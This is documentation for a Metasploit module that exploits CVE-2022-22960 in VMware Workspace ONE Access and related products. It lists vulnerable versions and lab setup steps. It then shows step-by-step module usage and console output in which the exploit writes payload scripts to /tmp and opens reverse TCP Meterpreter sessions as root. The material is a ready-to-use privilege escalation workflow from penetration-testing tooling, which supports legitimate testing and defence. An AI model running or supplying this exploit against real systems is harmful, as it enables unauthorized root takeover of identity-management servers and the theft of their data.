## Vulnerable Application

This module exploits CVE-2022-22960 which allows the user to overwrite the permissions of the certproxyService.sh script
so that it can be modified by the horizon user. This allows a local attacker with the uid 1001 to escalate their
privileges to root access.

| Vulnerable Application  | Vulnerable version   |
|---|---|
| VMware Workspace ONE Access (Access)   |  21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0  |
| VMware Identity Manager (vIDM)  |  3.3.6, 3.3.5, 3.3.4, 3.3.3  |
| VMware vRealize Automation (vRA)  |  8.x, 7.6  |
| VMware Cloud Foundation | 4.x | 
| vRealize Suite Lifecycle Manager| 8.x |

### Setup

In order to download a vulnerable application you do need VMware Customer Connect credentials. Navigate to
[Download VMware Workspace ONE Access (VIDM)](https://customerconnect.vmware.com/downloads/info/slug/desktop_end_user_computing/vmware_workspace_one_access_vidm/20_10).
to download the OVA file. 
During VM Configuration within VMware Fusion, in Addition Settings input the following: 

#### Application:

Timezone: (timezone of your choice)

Join the VMware Custom Experience Improvement Program: (deselect)

#### Networking Properties: (note the following may depend on your network configuration)

Host Name (FQDN): access01.corp.local

Default Gateway: 192.168.123.1 

Domain Name: (blank)

Domain Search Path: (blank)

DNS: 192.168.123.1 

IP Address: 192.168.123.16 
Network: 255.255.255.0

Add the following line to your `/etc/hosts` file:
`192.168.123.16 access.test.local`

Be sure to change the network adapter of the VM to the network adapter that corresponds to the subnet of the static IP address you assigned above.

#### GUI Setup

Once running navigate to https://access.test.local:8443/cfg/setup
in order to complete the following setup requirements:

Set Passwords
 - Appliance Administrator Account
 - Appliance Root Account
 - Remote User Account

Select Database
 - Database Type: Internal Database

## Verification Steps

1. Start msfconsole
1. Do: `use exploit/linux/local/vmware_workspace_one_access_cve_2022_22960`
1. Set the `SESSION`, `LHOST`, and `TARGET`
1. Run the module
1. Receive a Meterpreter session as the `root` user.

## Scenarios
### VMware Identity Manager 21.08.0.1-19010796

```
msf6 exploit(linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain) > use exploit/linux/local/vmware_workspace_one_access_cve_2022_22960
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/local/vmware_workspace_one_access_cve_2022_22960) > set lhost 192.168.123.1
lhost => 192.168.123.1
msf6 exploit(linux/local/vmware_workspace_one_access_cve_2022_22960) > set lport 4443
lport => 4443
msf6 exploit(linux/local/vmware_workspace_one_access_cve_2022_22960) > run

[*] Started reverse TCP handler on 192.168.123.1:4443
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. vulnerable
[*] Writing '/tmp/QbCpIao.sh' (1658 bytes) ...
[*] Triggering the payload...
[*] Sending stage (24772 bytes) to 192.168.123.16
[+] Deleted /tmp/QbCpIao.sh
[*] Meterpreter session 9 opened (192.168.123.1:4443 -> 192.168.123.16:53800) at 2023-04-07 10:38:05 -0400

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer        : access01.corp.local
OS              : Linux 4.19.217-1.ph3 #1-photon SMP Thu Dec 2 02:29:27 UTC 2021
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.123.16 - Meterpreter session 9 closed.  Reason: User exit
msf6 exploit(linux/local/vmware_workspace_one_access_cve_2022_22960) > set target 1
target => 1
msf6 exploit(linux/local/vmware_workspace_one_access_cve_2022_22960) > run

[*] Started reverse TCP handler on 192.168.123.1:4443
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. vulnerable
[*] Writing '/tmp/oMNw.sh' (250 bytes) ...
[*] Writing '/tmp/FsMoUmqB.sh' (1132 bytes) ...
[*] Triggering the payload...
[*] Sending stage (3045348 bytes) to 192.168.123.16
[+] Deleted /tmp/oMNw.sh
[+] Deleted /tmp/FsMoUmqB.sh
[*] Meterpreter session 10 opened (192.168.123.1:4443 -> 192.168.123.16:53838) at 2023-04-07 10:38:34 -0400

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : access01.corp.local
OS           : VMware Photon OS 3.0 (Linux 4.19.217-1.ph3)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
